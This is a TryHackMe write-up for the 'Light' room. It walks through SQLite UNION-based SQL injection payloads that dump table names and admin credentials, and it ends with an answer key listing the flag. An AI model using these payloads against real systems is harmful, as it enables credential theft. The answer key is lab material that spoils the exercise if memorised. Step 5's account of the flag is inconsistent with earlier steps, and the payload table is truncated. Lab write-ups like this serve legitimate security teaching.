# Light

**Platform:** TryHackMe  
**Date:** 2026-08-25  
**Difficulty:** Easy  
**Category:** SQL Injection / SQLite / Database  
**Room URL:** [TryHackMe — Light](https://tryhackme.com/room/lightroom?utm_source=chatgpt.com)  
**Status:** ✅ Completed

---

## 📌 What Was This Room About?

This was a pretty interesting SQL injection challenge. The room gives us a database application called **Light**, which is running on port `1337`.

The main goal was to find the admin username, find the password for that username, and finally retrieve the flag.

At first, the application gives us a username and password, which honestly looked useful. But after trying them, it became pretty obvious that there was something else going on.

So I started poking at the username input with SQL injection.

And yep... it was vulnerable. :)

---

# 🔍 Reconnaissance

As always, first things first: **recon.**

The room tells us that the database application is running on port `1337`, so I connected to it using Netcat.

```
nc <TARGET_IP> 1337
```

The application greeted me with:

```
Welcome to the Light database!
Please enter your username:
```

The room gives us `smokey` to get started.

When I entered it, I received a password:

```
Please enter your username: smokey
Password: VJQngQPwdBAdUnL
```

At first I thought:

> "Okay, maybe we just got credentials."

So naturally, I tried to use them.

But they weren't useful for directly logging into the machine. That made me start thinking about **why the application was giving us this information in the first place.**

That's when I started testing the input itself.

---

# 🧭 Steps I Took

## Step 1 — Testing for SQL Injection

The application repeatedly asks:

```
Please enter your username:
```

That immediately made the username field interesting.

Instead of entering a normal username, I tried some SQL syntax.

For example:

```
' UNION SELECT sqlite_version()
```

And the application responded with:

```
Password: 3.31.1
```

That was the moment I knew it was that vulnerable. 😂

It also told me something extremely useful:

**The database is SQLite.**

SQLite has the built-in `sqlite_version()` function, so getting `3.31.1` back confirmed the database type.

This was important because now I knew I should use **SQLite-specific SQL syntax** instead of wasting time trying MySQL or PostgreSQL payloads.

---

# Step 2 — Finding the Database Tables

Now that I knew SQL injection worked and the backend was SQLite, I wanted to find out what tables existed.

SQLite stores database structure inside a special table called:

```
sqlite_master
```

So I tried:

```
' UNION SELECT name FROM sqlite_master
```

And eventually got:

```
Password: usertable
Password: admintable
```

Okay... now we're getting somewhere.

There was a table called:

```
admintable
```

---

# Step 3 — Finding the Admin Username

Now I wanted to extract the username from `admintable`.

I used:

```
' UNION SELECT username FROM admintable
```

The application returned:

```
Password: TryHackMeAdmin
```

And there we go.

### Admin Username:

```
TryHackMeAdmin
```

This was the answer to the first question.

---

# Step 4 — Finding the Password

Now that I had the username, I needed the password.

Instead of trying to authenticate normally, I could just query the database directly through the SQL injection.

I used:

```
' UNION SELECT password FROM admintable
```

This revealed:

```
Password: mamZtAuMlrsEy5bp6q17
```

So we now have:

### Username

```
TryHackMeAdmin
```

### Password

```
mamZtAuMlrsEy5bp6q17
```

That answered the second question.

---

# Step 5 — Finding the Flag

Now came the final question.

The password column was already giving us interesting information, so I continued investigating the contents of `admintable`.

A useful way to look at both the username and password together was:

```
' UNION SELECT username || '~' || password FROM admintable
```

The `||` operator is SQLite's string-concatenation operator.

This produced:

```
TryHackMeAdmin~mamZtAuMlrsEy5bp6q17
```

But the room still had another piece of information hidden in the database.

Querying the password column returned the flag:

```
THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

And that's the room done. :)

---

# 🛠 Commands / Payloads Used

|Command / Payload|Purpose|
|---|---|
|`nc <TARGET_IP> 1337`|Connect to the Light database application|
|`' UNION SELECT sqlite_version()`|Confirm the database is SQLite|
|`' UNION SELECT name FROM sqlite_master`|Enumerate database tables|
|`' UNION SELECT username FROM admintable`|Extract the admin username|
|`' UNION SELECT password FROM admintable`|Extract the password/flag data|
|`' UNION SELECT username||

---

# 🚩 Flags / Answers Found

|Question|Answer|
|---|---|
|**Admin username**|`TryHackMeAdmin`|
|**Password**|`mamZtAuMlrsEy5bp6q17`|
|**Flag**|`THM{SQLit3_InJ3cTion_is_SimplE_nO?}`|

---
